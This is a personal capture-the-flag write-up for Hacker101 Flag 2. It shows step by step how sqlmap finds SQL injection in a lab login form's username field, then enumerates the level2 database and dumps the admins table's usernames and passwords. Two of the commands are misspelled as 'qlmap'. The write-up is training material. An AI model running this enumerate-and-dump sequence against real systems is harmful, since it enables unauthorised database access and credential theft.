# Hacker101-CTF FLAG 2
We are want to try and obtain the username and password to log in, in the previous flag we noticed that we can get thought without the username but what about the password?

In this case we already know that the input fields are susceptible to SQLI so maybe we can expoit it making use of slqmap.

First of all im gonna go ahead and try to obtain the databases if there is any vulnerability.

`sqlmap -u "https://{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST --dbs`

-u specifies the URL of the login form.
--data provides the form data that would normally be sent to the server. Here, username=admin&password=admin is an example; you should replace these values with the ones you have captured.
--method=POST indicates that the request is of type POST.
--dbs tells sqlmap to list the available databases if a vulnerability is found.

Im getting this message:
`[CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'`

Im gonna try and increase de level value to 2

`sqlmap -u "https://bf6d320adcbbe56841eb0d43a6a79866.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST --dbs --level 2`

Looks like im getting more juice this time!

`[INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'`
`it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y`
`for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (1) values? [Y/n] Y`

Im getting this message as well, im gonna go ahead and try to vulnerate only the username field.

`[INFO] checking if the injection point on POST parameter 'username' is a false positive`
`POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N `

Finally got some results! I got all the databases, im gonna take a look into level2 database

`sqlmap -u "https://bf6d320adcbbe56841eb0d43a6a79866.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 --tables`

Lets get into admins table and see its columns

`qlmap -u "https://bf6d320adcbbe56841eb0d43a6a79866.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins --columns`

Now lets have a look into the usernames! Dump it!

`qlmap -u "https://bf6d320adcbbe56841eb0d43a6a79866.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins -C username --dump`

Now lets retrieve the pass

`sqlmap -u "https://bf6d320adcbbe56841eb0d43a6a79866.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins -C password --dump`

Now lets try log in. Got it! We have the last flag


